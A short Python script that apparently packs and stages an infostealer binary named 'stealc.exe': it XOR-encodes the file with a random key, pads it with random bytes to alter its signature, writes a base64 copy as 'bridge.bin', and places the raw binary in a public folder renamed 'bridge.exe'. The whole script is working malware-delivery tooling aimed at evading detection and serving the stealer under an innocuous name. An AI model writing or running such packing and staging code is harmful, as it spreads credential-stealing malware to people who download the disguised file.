import base64, os, random
data = open('stealc.exe','rb').read()
key = random.randint(1, 255)
out = bytes([key]) + bytes(b ^ key for b in data) + os.urandom(random.randint(2048, 8192))
open('bridge.bin','wb').write(base64.b64encode(out))
open('public/bridge.exe','wb').write(data)
print('ok, key =', hex(key))
